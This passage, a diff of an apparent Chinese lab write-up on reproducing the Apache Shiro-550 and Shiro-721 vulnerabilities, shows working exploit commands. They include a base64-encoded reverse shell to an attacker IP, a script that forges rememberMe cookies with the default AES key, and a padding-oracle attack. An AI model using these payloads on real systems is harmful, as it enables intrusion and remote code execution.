@@ -323,10 +323,16 @@
 
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h4 id="Shiro-550漏洞复现"><a href="#Shiro-550漏洞复现" class="headerlink" title="Shiro-550漏洞复现"></a>Shiro-550漏洞复现</h4><p>我们首先访问下登录界面，可以看到账户密码都给我们了</p>
 <p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20210814142115.png"></p>
+</br>
+
 <p>通过burpsuite进行抓包，我们来看下shiro rememberme后的数据包</p>
 <p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20210814142310.png"></p>
+</br>
+
 <p>这是认证成功后的跳转，我们可以看到rememberme设置的一串类似aes的密文</p>
 <p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20210814142411.png"></p>
+</br>
+
 <p>通过爆破shiro密钥的软件进行密钥探测（研究漏洞利用原理，所以就不用软件自带的）</p>
 <p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20210814151309.png"></p>
 </br>
@@ -354,25 +360,39 @@
 <p>最后使用ysoserial的JRMP监听模块，监听6666端口并执行反弹shell命令</p>
 <figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">java -cp ysoserial-<span class="hljs-number">0.0</span>.<span class="hljs-number">6</span>-SNAPSHOT-all<span class="hljs-selector-class">.jar</span> ysoserial<span class="hljs-selector-class">.exploit</span><span class="hljs-selector-class">.JRMPListener</span> 【port】 CommonsCollections4 <span class="hljs-string">&#x27;【commands】&#x27;</span><br>构造后<br>java -cp ysoserial-<span class="hljs-number">0.0</span>.<span class="hljs-number">6</span>-SNAPSHOT-all<span class="hljs-selector-class">.jar</span> ysoserial<span class="hljs-selector-class">.exploit</span><span class="hljs-selector-class">.JRMPListener</span> <span class="hljs-number">6666</span> CommonsCollections4 <span class="hljs-string">&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTE2LzEyMzQgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span><br></code></pre></td></tr></table></figure>
 
+</br>
+
 <p>使用我们的shiro进行编码来构造payload</p>
 <figure class="highlight css"><table><tr><td class="code"><pre><code class="hljs css">import sys<br>import uuid<br>import base64<br>import subprocess<br><span class="hljs-selector-tag">from</span> Crypto<span class="hljs-selector-class">.Cipher</span> import AES<br>def encode_rememberme(command):<br>    popen = subprocess.<span class="hljs-built_in">Popen</span>([<span class="hljs-string">&#x27;java&#x27;</span>, <span class="hljs-string">&#x27;-jar&#x27;</span>, <span class="hljs-string">&#x27;ysoserial-0.0.6-SNAPSHOT-all.jar&#x27;</span>, <span class="hljs-string">&#x27;JRMPClient&#x27;</span>, command], stdout=subprocess.PIPE)<br>    BS = AES.block_size<br>    pad = lambda s: s + ((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).<span class="hljs-built_in">encode</span>()<br>    key = base64.<span class="hljs-built_in">b64decode</span>(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)<br>    iv = uuid.<span class="hljs-built_in">uuid4</span>().bytes<br>    encryptor = AES.<span class="hljs-built_in">new</span>(key, AES.MODE_CBC, iv)<br>    file_body = <span class="hljs-built_in">pad</span>(popen.stdout.<span class="hljs-built_in">read</span>())<br>    base64_ciphertext = base64.<span class="hljs-built_in">b64encode</span>(iv + encryptor.<span class="hljs-built_in">encrypt</span>(file_body))<br>    return base64_ciphertext<br><br>if __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    payload = <span class="hljs-built_in">encode_rememberme</span>(sys.argv[<span class="hljs-number">1</span>])   <br>print <span class="hljs-string">&quot;rememberMe=&#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(payload.<span class="hljs-built_in">decode</span>())<br></code></pre></td></tr></table></figure>
+
+</br>
 
 <p>python生成我们的最终payload</p>
 <figure class="highlight dsconfig"><table><tr><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">python2</span>安装<span class="hljs-string">pip</span><br><span class="hljs-string">curl</span> <span class="hljs-string">https</span>://<span class="hljs-string">bootstrap</span>.<span class="hljs-string">pypa</span>.<span class="hljs-string">io</span>/<span class="hljs-built_in">get-pip.py</span> -<span class="hljs-string">o</span> <span class="hljs-built_in">get-pip.py</span><br><span class="hljs-string">sudo</span> <span class="hljs-string">python2</span> <span class="hljs-built_in">get-pip.py</span><br><span class="hljs-string">pip</span> <span class="hljs-string">install</span> <span class="hljs-built_in">--upgrade</span> <span class="hljs-string">setuptools</span><br><span class="hljs-string">sudo</span> <span class="hljs-string">apt-get</span> <span class="hljs-string">install</span> <span class="hljs-string">build-essential</span> <span class="hljs-string">python-dev</span> <span class="hljs-string">libssl-dev</span> <span class="hljs-string">libffi-dev</span> <span class="hljs-string">libxml2</span> <span class="hljs-string">libxml2-dev</span> <span class="hljs-string">libxslt1-dev</span> <span class="hljs-string">zlib1g-dev</span><br><span class="hljs-string">sudo</span> <span class="hljs-string">pip2</span> <span class="hljs-string">install</span> <span class="hljs-string">pycrypto</span><br><br>生成<span class="hljs-string">payload</span>，记得是要在<span class="hljs-string">ysoserial</span>目录下<br><span class="hljs-string">python2</span> <span class="hljs-string">shiro</span>.<span class="hljs-string">py</span> <span class="hljs-string">ip:JRMP监</span>听端口<br><span class="hljs-string">python2</span> <span class="hljs-string">shiro</span>.<span class="hljs-string">py</span> <span class="hljs-string">192</span>.<span class="hljs-string">168</span>.<span class="hljs-string">1</span>.<span class="hljs-string">116:6666</span><br></code></pre></td></tr></table></figure>
 
+</br>
+
 <p>将获取到payload填入登录的cookie中</p>
 <p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20210814180502.png"></p>
+</br>
+
 <p>成功获取到shell</p>
 <p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20210814180606.png"></p>
 </br>
 
 <h4 id="Shiro-721漏洞复现"><a href="#Shiro-721漏洞复现" class="headerlink" title="Shiro-721漏洞复现"></a>Shiro-721漏洞复现</h4><p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20210814191030.png"></p>
+</br>
+
 <p>使用dnslog进行</p>
 <figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -jar ysoserial-<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">6</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar CommonsBeanutils<span class="hljs-number">1</span> <span class="hljs-string">&quot;ping k95ut8.dnslog.cn&quot;</span> &gt; payload.class<br></code></pre></td></tr></table></figure>
+
+</br>
 
 <p>使用rememberme作为前缀来加载payload，进行Padding Oracle攻击</p>
 <p>使用靶场自带的exp</p>
 <p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20210814195612.png"></p>
+</br>
+
 <figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python2</span> setup.py build<br><span class="hljs-attribute">python2</span> setup.py install<br><span class="hljs-attribute">python2</span> shiro_payload.py http://<span class="hljs-number">192.168.1.115:8080</span>/account/ lq<span class="hljs-number">91</span>JAxRWju<span class="hljs-number">1</span>xv<span class="hljs-number">4</span>/XcHeWqh/TukrkTuxn<span class="hljs-number">2</span>LD<span class="hljs-number">1</span>CrBZ/JSs<span class="hljs-number">9</span>oOZSZo<span class="hljs-number">8</span>cYlevwOZt<span class="hljs-number">54</span>yTw<span class="hljs-number">4</span>vHMh<span class="hljs-number">6</span>yyB<span class="hljs-number">9</span>xS<span class="hljs-number">7</span>BoJ<span class="hljs-number">49</span>IPwET<span class="hljs-number">60</span>IuQFgBZwCUwAu/uTjlAoRG<span class="hljs-number">4</span>rNh<span class="hljs-number">9</span>YiYL/<span class="hljs-number">8</span>bIIyDgOACT<span class="hljs-number">3</span>+t/Yk+L<span class="hljs-number">6</span>Hn/up<span class="hljs-number">3</span>u<span class="hljs-number">9</span>xMZ<span class="hljs-number">9</span>pWRjVK<span class="hljs-number">7</span>DQ<span class="hljs-number">3</span>ZccfqgOms<span class="hljs-number">08</span>TDrFrdwFnDOnUt<span class="hljs-number">2</span>erQ<span class="hljs-number">4</span>vb<span class="hljs-number">6</span>CCHGf<span class="hljs-number">0</span>QslhbrnDF<span class="hljs-number">0</span>VcblDigreQ<span class="hljs-number">9</span>vyzGfPkCW<span class="hljs-number">3</span>gDeDf+iwddvrFwlvd<span class="hljs-number">7</span>d+<span class="hljs-number">9</span>BKmhM+QuM<span class="hljs-number">8</span>nq<span class="hljs-number">0</span>RCg<span class="hljs-number">96</span>XJNCD<span class="hljs-number">6</span>PmmRMom<span class="hljs-number">0</span>o<span class="hljs-number">8</span>bUHTCg<span class="hljs-number">0</span>OSKJnGBRPeuult<span class="hljs-number">6</span>aoZtttGdZ<span class="hljs-number">0</span>MDyYZooZp<span class="hljs-number">4</span>LP<span class="hljs-number">7</span>ojtS<span class="hljs-number">1</span>ZVLYavpAv<span class="hljs-number">6</span>RQ<span class="hljs-number">93</span>BeO<span class="hljs-number">5</span>ZOx<span class="hljs-number">0</span>nIkTqJ<span class="hljs-number">7</span>CTxG<span class="hljs-number">8</span>CB<span class="hljs-number">8</span>XzvvxvK<span class="hljs-number">6</span>oGOURA<span class="hljs-number">2</span>UE<span class="hljs-number">3</span>IIzoukbglzKAVWOdMD<span class="hljs-number">0</span>BmjBOH<span class="hljs-number">1</span>xQfAHXXFpHH<span class="hljs-number">2</span>VkgiSPPMeZMe<span class="hljs-number">1</span>+yVhSgumjhRN<span class="hljs-number">5</span>c<span class="hljs-number">97</span>bY<span class="hljs-number">9</span>d+<span class="hljs-number">49</span>hkoleEBAOtS<span class="hljs-number">1</span>pIKIxdAuwHRP<span class="hljs-number">0</span>WgNZPqFFLmtG/s/Os payload.class<br></code></pre></td></tr></table></figure>
 
 <p>爆破需要3个小时，所以就不演示，最后就将获取到的cookie替换即可，最后查看dnslog平台</p>
